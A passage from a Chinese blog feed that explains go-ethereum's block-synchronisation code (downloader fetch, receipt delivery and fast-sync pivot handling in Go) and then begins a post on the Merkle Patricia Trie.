throughput but don&#x27;t drop just yet. If even the minimal times</span><br><span class="line">          // out that sync wise we need to get rid of the peer.</span><br><span class="line">          //</span><br><span class="line">          // The reason the minimum threshold is 2 is because the downloader tries to estimate the bandwidth</span><br><span class="line">          // and latency of a peer separately, which requires pushing the measures capacity a bit and seeing</span><br><span class="line">          // how response times reacts, to it always requests one more than the minimum (i.e. min 2).</span><br><span class="line">          if fails &gt; 2 &#123;</span><br><span class="line">            peer.log.Trace(&quot;Data delivery timed out&quot;, &quot;type&quot;, kind)</span><br><span class="line">            setIdle(peer, 0, time.Now())</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            peer.log.Debug(&quot;Stalling delivery, dropping&quot;, &quot;type&quot;, kind)</span><br><span class="line"></span><br><span class="line">            if d.dropPeer == nil &#123;</span><br><span class="line">              // The dropPeer method is nil when `--copydb` is used for a local copy.</span><br><span class="line">              // Timeouts can occur if e.g. compaction hits at the wrong time, and can be ignored</span><br><span class="line">              peer.log.Warn(&quot;Downloader wants to drop peer, but peerdrop-function is not set&quot;, &quot;peer&quot;, pid)</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              d.dropPeer(pid)</span><br><span class="line"></span><br><span class="line">              // If this peer was the master peer, abort sync immediately</span><br><span class="line">              d.cancelLock.RLock()</span><br><span class="line">              master := pid == d.cancelPeer</span><br><span class="line">              d.cancelLock.RUnlock()</span><br><span class="line"></span><br><span class="line">              if master &#123;</span><br><span class="line">                d.cancel()</span><br><span class="line">                return errTimeout</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      // If there&#x27;s nothing more to fetch, wait or terminate</span><br><span class="line">      if pending() == 0 &#123;</span><br><span class="line">        if !inFlight() &amp;&amp; finished &#123;</span><br><span class="line">          log.Debug(&quot;Data fetching completed&quot;, &quot;type&quot;, kind)</span><br><span class="line">          return nil</span><br><span class="line">        &#125;</span><br><span class="line">        break</span><br><span class="line">      &#125;</span><br><span class="line">      // Send a download request to all idle peers, until throttled</span><br><span class="line">      progressed, throttled, running := false, false, inFlight()</span><br><span class="line">      idles, total := idle()</span><br><span class="line">      pendCount := pending()</span><br><span class="line">      for _, peer := range idles &#123;</span><br><span class="line">        // Short circuit if throttling activated</span><br><span class="line">        if throttled &#123;</span><br><span class="line">          break</span><br><span class="line">        &#125;</span><br><span class="line">        // Short circuit if there is no more available task.</span><br><span class="line">        if pendCount = pending(); pendCount == 0 &#123;</span><br><span class="line">          break</span><br><span class="line">        &#125;</span><br><span class="line">        // Reserve a chunk of fetches for a peer. A nil can mean either that</span><br><span class="line">        // no more headers are available, or that the peer is known not to</span><br><span class="line">        // have them.</span><br><span class="line">        request, progress, throttle := reserve(peer, capacity(peer))</span><br><span class="line">        if progress &#123;</span><br><span class="line">          progressed = true</span><br><span class="line">        &#125;</span><br><span class="line">        if throttle &#123;</span><br><span class="line">          throttled = true</span><br><span class="line">          throttleCounter.Inc(1)</span><br><span class="line">        &#125;</span><br><span class="line">        if request == nil &#123;</span><br><span class="line">          continue</span><br><span class="line">        &#125;</span><br><span class="line">        if request.From &gt; 0 &#123;</span><br><span class="line">          peer.log.Trace(&quot;Requesting new batch of data&quot;, &quot;type&quot;, kind, &quot;from&quot;, request.From)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          peer.log.Trace(&quot;Requesting new batch of data&quot;, &quot;type&quot;, kind, &quot;count&quot;, len(request.Headers), &quot;from&quot;, request.Headers[0].Number)</span><br><span class="line">        &#125;</span><br><span class="line">        // Fetch the chunk and make sure any errors return the hashes to the queue</span><br><span class="line">        if fetchHook != nil &#123;</span><br><span class="line">          fetchHook(request.Headers)</span><br><span class="line">        &#125;</span><br><span class="line">        if err := fetch(peer, request); err != nil &#123;</span><br><span class="line">          // Although we could try and make an attempt to fix this, this error really</span><br><span class="line">          // means that we&#x27;ve double allocated a fetch task to a peer. If that is the</span><br><span class="line">          // case, the internal state of the downloader and the queue is very wrong so</span><br><span class="line">          // better hard crash and note the error instead of silently accumulating into</span><br><span class="line">          // a much bigger issue.</span><br><span class="line">          panic(fmt.Sprintf(&quot;%v: %s fetch assignment failed&quot;, peer, kind))</span><br><span class="line">        &#125;</span><br><span class="line">        running = true</span><br><span class="line">      &#125;</span><br><span class="line">      // Make sure that we have peers available for fetching. If all peers have been tried</span><br><span class="line">      // and all failed throw an error</span><br><span class="line">      if !progressed &amp;&amp; !throttled &amp;&amp; !running &amp;&amp; len(idles) == total &amp;&amp; pendCount &gt; 0 &#123;</span><br><span class="line">        return errPeersUnavailable</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="同步收据"><strong>同步收据</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fetchReceipts iteratively downloads the scheduled block receipts, taking any</span></span><br><span class="line"><span class="comment">// available peers, reserving a chunk of receipts for each, waiting for delivery</span></span><br><span class="line"><span class="comment">// and also periodically checking for timeouts.</span></span><br><span class="line"><span class="title function_">func</span> (d *<span class="title class_">Downloader</span>) <span class="title function_">fetchReceipts</span>(<span class="keyword">from</span> uint64) error &#123;</span><br><span class="line">  log.<span class="title class_">Debug</span>(<span class="string">&quot;Downloading transaction receipts&quot;</span>, <span class="string">&quot;origin&quot;</span>, <span class="keyword">from</span>)</span><br><span class="line"></span><br><span class="line">  <span class="title function_">var</span> (</span><br><span class="line">    deliver = <span class="title function_">func</span>(packet dataPack) (int, error) &#123;</span><br><span class="line">      pack := packet.(*receiptPack)</span><br><span class="line">      <span class="keyword">return</span> d.<span class="property">queue</span>.<span class="title class_">DeliverReceipts</span>(pack.<span class="property">peerID</span>, pack.<span class="property">receipts</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    expire   = <span class="title function_">func</span>() map[string]int &#123; <span class="keyword">return</span> d.<span class="property">queue</span>.<span class="title class_">ExpireReceipts</span>(d.<span class="title function_">requestTTL</span>()) &#125;</span><br><span class="line">    fetch    = <span class="title function_">func</span>(p *peerConnection, req *fetchRequest) error &#123; <span class="keyword">return</span> p.<span class="title class_">FetchReceipts</span>(req) &#125;</span><br><span class="line">    capacity = <span class="title function_">func</span>(p *peerConnection) int &#123; <span class="keyword">return</span> p.<span class="title class_">ReceiptCapacity</span>(d.<span class="title function_">requestRTT</span>()) &#125;</span><br><span class="line">    setIdle  = <span class="title function_">func</span>(<span class="params">p *peerConnection, accepted int, deliveryTime time.Time</span>) &#123;</span><br><span class="line">      p.<span class="title class_">SetReceiptsIdle</span>(accepted, deliveryTime)</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line">  err := d.<span class="title function_">fetchParts</span>(d.<span class="property">receiptCh</span>, deliver, d.<span class="property">receiptWakeCh</span>, expire,</span><br><span class="line">    d.<span class="property">queue</span>.<span class="property">PendingReceipts</span>, d.<span class="property">queue</span>.<span class="property">InFlightReceipts</span>, d.<span class="property">queue</span>.<span class="property">ReserveReceipts</span>,</span><br><span class="line">    d.<span class="property">receiptFetchHook</span>, fetch, d.<span class="property">queue</span>.<span class="property">CancelReceipts</span>, capacity, d.<span class="property">peers</span>.<span class="property">ReceiptIdlePeers</span>, setIdle, <span class="string">&quot;receipts&quot;</span>)</span><br><span class="line"></span><br><span class="line">  log.<span class="title class_">Debug</span>(<span class="string">&quot;Transaction receipt download terminated&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// DeliverReceipts injects a new batch of receipts received from a remote node.</span></span><br><span class="line"><span class="title function_">func</span> (d *<span class="title class_">Downloader</span>) <span class="title class_">DeliverReceipts</span>(id string, receipts [][]*types.<span class="property">Receipt</span>) error &#123;</span><br><span class="line">  <span class="keyword">return</span> d.<span class="title function_">deliver</span>(d.<span class="property">receiptCh</span>, &amp;receiptPack&#123;id, receipts&#125;, receiptInMeter, receiptDropMeter)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// deliver injects a new batch of data received from a remote node.</span></span><br><span class="line"><span class="title function_">func</span> (d *<span class="title class_">Downloader</span>) <span class="title function_">deliver</span>(destCh chan dataPack, packet dataPack, inMeter, dropMeter metrics.<span class="property">Meter</span>) (err error) &#123;</span><br><span class="line">  <span class="comment">// Update the delivery metrics for both good and failed deliveries</span></span><br><span class="line">  inMeter.<span class="title class_">Mark</span>(<span class="title function_">int64</span>(packet.<span class="title class_">Items</span>()))</span><br><span class="line">  defer <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">      dropMeter.<span class="title class_">Mark</span>(<span class="title function_">int64</span>(packet.<span class="title class_">Items</span>()))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;()</span><br><span class="line">  <span class="comment">// Deliver or abort if the sync is canceled while queuing</span></span><br><span class="line">  d.<span class="property">cancelLock</span>.<span class="title class_">RLock</span>()</span><br><span class="line">  cancel := d.<span class="property">cancelCh</span></span><br><span class="line">  d.<span class="property">cancelLock</span>.<span class="title class_">RUnlock</span>()</span><br><span class="line">  <span class="keyword">if</span> cancel == nil &#123;</span><br><span class="line">    <span class="keyword">return</span> errNoSyncActive</span><br><span class="line">  &#125;</span><br><span class="line">  select &#123;</span><br><span class="line">  <span class="keyword">case</span> destCh &lt;- <span class="attr">packet</span>:</span><br><span class="line">    <span class="keyword">return</span> nil</span><br><span class="line">  <span class="keyword">case</span> <span class="language-xml">&lt;-cancel:</span></span><br><span class="line"><span class="language-xml">    return errNoSyncActive</span></span><br><span class="line"><span class="language-xml">  &#125;</span></span><br><span class="line"><span class="language-xml">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>Content</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// processFullSyncContent takes fetch results from the queue and imports them into the chain.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> processFullSyncContent() <span class="type">error</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    results := d.queue.Results(<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(results) == <span class="number">0</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> d.chainInsertHook != <span class="literal">nil</span> &#123;</span><br><span class="line">      d.chainInsertHook(results)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := d.importBlockResults(results); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// processFastSyncContent takes fetch results from the queue and writes them to the</span></span><br><span class="line"><span class="comment">// database. It also controls the synchronisation of state nodes of the pivot block.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> processFastSyncContent() <span class="type">error</span> &#123;</span><br><span class="line">  <span class="comment">// Start syncing state of the reported head block. This should get us most of</span></span><br><span class="line">  <span class="comment">// the state of the pivot block.</span></span><br><span class="line">  d.pivotLock.RLock()</span><br><span class="line">  sync := d.syncState(d.pivotHeader.Root)</span><br><span class="line">  d.pivotLock.RUnlock()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// The `sync` object is replaced every time the pivot moves. We need to</span></span><br><span class="line">    <span class="comment">// defer close the very last active one, hence the lazy evaluation vs.</span></span><br><span class="line">    <span class="comment">// calling defer sync.Cancel() !!!</span></span><br><span class="line">    sync.Cancel()</span><br><span class="line">  &#125;()</span><br><span class="line"></span><br><span class="line">  closeOnErr := <span class="function"><span class="keyword">func</span><span class="params">(s *stateSync)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err := s.Wait(); err != <span class="literal">nil</span> &amp;&amp; err != errCancelStateFetch &amp;&amp; err != errCanceled &amp;&amp; err != snap.ErrCancelled &#123;</span><br><span class="line">      d.queue.Close() <span class="comment">// wake up Results</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">go</span> closeOnErr(sync)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// To cater for moving pivot points, track the pivot block and subsequently</span></span><br><span class="line">  <span class="comment">// accumulated download results separately.</span></span><br><span class="line">  <span class="keyword">var</span> (</span><br><span class="line">    oldPivot *fetchResult   <span class="comment">// Locked in pivot block, might change eventually</span></span><br><span class="line">    oldTail  []*fetchResult <span class="comment">// Downloaded content after the pivot</span></span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="comment">// Wait for the next batch of downloaded data to be available, and if the pivot</span></span><br><span class="line">    <span class="comment">// block became stale, move the goalpost</span></span><br><span class="line">    results := d.queue.Results(oldPivot == <span class="literal">nil</span>) <span class="comment">// Block if we&#x27;re not monitoring pivot staleness</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(results) == <span class="number">0</span> &#123;</span><br><span class="line">      <span class="comment">// If pivot sync is done, stop</span></span><br><span class="line">      <span class="keyword">if</span> oldPivot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sync.Cancel()</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// If sync failed, stop</span></span><br><span class="line">      <span class="keyword">select</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> &lt;-d.cancelCh:</span><br><span class="line">        sync.Cancel()</span><br><span class="line">        <span class="keyword">return</span> errCanceled</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> d.chainInsertHook != <span class="literal">nil</span> &#123;</span><br><span class="line">      d.chainInsertHook(results)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// If we haven&#x27;t downloaded the pivot block yet, check pivot staleness</span></span><br><span class="line">    <span class="comment">// notifications from the header downloader</span></span><br><span class="line">    d.pivotLock.RLock()</span><br><span class="line">    pivot := d.pivotHeader</span><br><span class="line">    d.pivotLock.RUnlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> oldPivot == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> pivot.Root != sync.root &#123;</span><br><span class="line">        sync.Cancel()</span><br><span class="line">        sync = d.syncState(pivot.Root)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">go</span> closeOnErr(sync)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      results = <span class="built_in">append</span>(<span class="built_in">append</span>([]*fetchResult&#123;oldPivot&#125;, oldTail...), results...)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Split around the pivot block and process the two sides via fast/full sync</span></span><br><span class="line">    <span class="keyword">if</span> atomic.LoadInt32(&amp;d.committed) == <span class="number">0</span> &#123;</span><br><span class="line">      latest := results[<span class="built_in">len</span>(results)<span class="number">-1</span>].Header</span><br><span class="line">      <span class="comment">// If the height is above the pivot block by 2 sets, it means the pivot</span></span><br><span class="line">      <span class="comment">// become stale in the network and it was garbage collected, move to a</span></span><br><span class="line">      <span class="comment">// new pivot.</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// Note, we have `reorgProtHeaderDelay` number of blocks withheld, Those</span></span><br><span class="line">      <span class="comment">// need to be taken into account, otherwise we&#x27;re detecting the pivot move</span></span><br><span class="line">      <span class="comment">// late and will drop peers due to unavailable state!!!</span></span><br><span class="line">      <span class="keyword">if</span> height := latest.Number.Uint64(); height &gt;= pivot.Number.Uint64()+<span class="number">2</span>*<span class="type">uint64</span>(fsMinFullBlocks)-<span class="type">uint64</span>(reorgProtHeaderDelay) &#123;</span><br><span class="line">        log.Warn(<span class="string">&quot;Pivot became stale, moving&quot;</span>, <span class="string">&quot;old&quot;</span>, pivot.Number.Uint64(), <span class="string">&quot;new&quot;</span>, height-<span class="type">uint64</span>(fsMinFullBlocks)+<span class="type">uint64</span>(reorgProtHeaderDelay))</span><br><span class="line">        pivot = results[<span class="built_in">len</span>(results)<span class="number">-1</span>-fsMinFullBlocks+reorgProtHeaderDelay].Header <span class="comment">// must exist as lower old pivot is uncommitted</span></span><br><span class="line"></span><br><span class="line">        d.pivotLock.Lock()</span><br><span class="line">        d.pivotHeader = pivot</span><br><span class="line">        d.pivotLock.Unlock()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out the pivot into the database so a rollback beyond it will</span></span><br><span class="line">        <span class="comment">// reenable fast sync</span></span><br><span class="line">        rawdb.WriteLastPivotNumber(d.stateDB, pivot.Number.Uint64())</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    P, beforeP, afterP := splitAroundPivot(pivot.Number.Uint64(), results)</span><br><span class="line">    <span class="keyword">if</span> err := d.commitFastSyncData(beforeP, sync); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> P != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="comment">// If new pivot block found, cancel old state retrieval and restart</span></span><br><span class="line">      <span class="keyword">if</span> oldPivot != P &#123;</span><br><span class="line">        sync.Cancel()</span><br><span class="line">        sync = d.syncState(P.Header.Root)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">go</span> closeOnErr(sync)</span><br><span class="line">        oldPivot = P</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Wait for completion, occasionally checking for pivot staleness</span></span><br><span class="line">      <span class="keyword">select</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> &lt;-sync.done:</span><br><span class="line">        <span class="keyword">if</span> sync.err != <span class="literal">nil</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> sync.err</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err := d.commitPivotBlock(P); err != <span class="literal">nil</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        oldPivot = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> &lt;-time.After(time.Second):</span><br><span class="line">        oldTail = afterP</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Fast sync done, pivot commit done, full import</span></span><br><span class="line">    <span class="keyword">if</span> err := d.importBlockResults(afterP); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>小问题</p></blockquote><p><strong>问题：</strong> <em>light</em> 节点与 <em>full</em> 节点是如何交互的？<br><strong>解答：</strong> 首先，light 节点会维护多个与 full 节点的 p2p 连接。然后，当 light 节点需要与 full 节点交互时，会将需要发送的请求放到一个请求队列中。light 节点会启动一个 goroutine 不断从请求队列里获取请求，然后从 p2p 节点列表里选一个当前最好用的节点，将请求发出去。请求得到的结果会发到本地数据库和缓存里。</p><p>作者：Ashton<br>链接：<a href="https://www.jianshu.com/p/b31c208acaaa">https://www.jianshu.com/p/b31c208acaaa</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><blockquote><p>转载于<a href="https://cloud.tencent.com/developer/article/1850727">以太坊区块同步 </a></p></blockquote><h2 id="参考链接"><strong>参考链接</strong></h2><p><a href="https://www.jianshu.com/p/427fbc3a25f9">https://www.jianshu.com/p/427fbc3a25f9</a></p><p><a href="https://blog.csdn.net/pulong0748/article/details/111574388">https://blog.csdn.net/pulong0748/article/details/111574388</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>MPT树</title>
    <link href="https://www.blog-blockchain.xyz/geth/MPT-Tree/"/>
    <id>https://www.blog-blockchain.xyz/geth/MPT-Tree/</id>
    <published>2022-08-25T04:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><blockquote><p>由于<strong>MPT 树</strong>不属于<strong>core</strong>部分所以有些地方并没有详细的解读，仅供参考。</p><p>由于该部分网上的解读都差异不大，故该文章<strong>大部分是进行整合</strong>，并且加上<strong>个人阅读源码</strong>的一些看法，所有图片都已经上传到个人仓库。</p><p>感谢前辈的精湛分析！</p></blockquote><p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220327222113848.png" alt="image-20220327222113848"></p><h1>前缀树 Trie</h1><p>前缀树（又称字典树），通常来说，一个前缀树是用来<code>存储字符串</code>的。前缀树的每一个节点代表一个<code>字符串</code>（<code>前缀</code>）。每一个节点会有多个子节点，通往不同子节点的路径上有着不同的字符。子节点代表的字符串是由节点本身的<code>原始字符串</code>，以及<code>通往该子节点路径上所有的字符</code>组成的。如下图所示：</p><p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1gm73i6xursj31820qq789.jpg"><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330161620588.png" alt="image-20220330161620588"></a></p><p>Trie 的结点看上去是这样子的：</p><blockquote><p>[ [Ia, Ib, … I*], value]</p></blockquote><p>其中 <code>[Ia, Ib, ... I*]</code> 在本文中我们将其称为结点的 <em>索引数组</em> ，它以 key 中的下一个字符为索引，每个元素<code>I*</code>指向对应的子结点。 <code>value</code> 则代表从根节点到当前结点的路径组成的 key 所对应的值。如果不存在这样一个 key，则 value 的值为空。</p><p>前缀树的性质：</p><ol><li>每一层节点上面的值都不相同；</li><li><strong>根节点不存储值</strong>；除根节点外每一个节点都<strong>只包含一个字符</strong>，代表的字符串是由节点本身的<code>原始字符串</code>，以及<code>通往该子节点路径上所有的字符</code>。</li><li>前缀树的查找效率是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>为所查找节点的长度，而哈希表的查找效率为<span class="katex"><span class="katex-mathml"><math 